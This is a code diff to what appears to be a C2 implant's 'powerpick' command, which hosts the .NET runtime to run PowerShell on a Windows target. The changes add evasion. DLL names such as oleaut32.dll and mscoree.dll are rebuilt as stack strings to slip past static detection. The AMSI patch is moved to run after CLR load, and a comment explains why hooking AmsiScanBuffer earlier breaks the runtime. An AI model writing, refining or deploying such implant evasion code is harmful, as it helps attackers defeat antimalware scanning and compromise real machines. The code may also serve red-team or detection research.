@@ -5,6 +5,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <stackstr.h>
 
 #ifdef INCLUDE_CMD_POWERPICK
 
@@ -132,7 +133,8 @@ auto declfn starburst::cmd_powerpick(
     DBG_PRINT( inst, "cmd_powerpick: runner=%u bytes, script=%u bytes\n", asm_len, script_len );
 
     // load oleaut32 for SAFEARRAY + BSTR functions
-    auto h_oleaut32 = inst.kernel32.LoadLibraryA( symbol<const char*>( "oleaut32.dll" ) );
+    STK_OLEAUT32(_n1);
+    auto h_oleaut32 = inst.kernel32.LoadLibraryA( _n1 );
     if ( !h_oleaut32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "oleaut32 load failed" ) ) );
@@ -167,12 +169,9 @@ auto declfn starburst::cmd_powerpick(
         inst.kernel32.GetProcAddress(
             (HMODULE)inst.kernel32.handle, symbol<LPCSTR>( "SetStdHandle" ) ) );
 
-    #if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
-        evasion_patch_amsi( inst );
-    #endif
-
     // load mscoree.dll for CLR hosting
-    auto h_mscoree = inst.kernel32.LoadLibraryA( symbol<const char*>( "mscoree.dll" ) );
+    STK_MSCOREE(_n2);
+    auto h_mscoree = inst.kernel32.LoadLibraryA( _n2 );
     if ( !h_mscoree ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "mscoree.dll load failed" ) ) );
@@ -378,6 +377,13 @@ auto declfn starburst::cmd_powerpick(
 
     VARIANT v_result;
     memory::zero( &v_result, sizeof( VARIANT ) );
+
+    // Patch AMSI after CLR is loaded — HWBP on AmsiScanBuffer during CLR
+    // init corrupts CLR state (CLR calls AmsiScanBuffer internally and
+    // the VEH skip breaks its initialization sequence).
+    #if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
+        evasion_patch_amsi( inst );
+    #endif
 
     // _MethodInfo::Invoke_3 at vtable[37]
     typedef HRESULT ( __stdcall *fn_Invoke3 )(
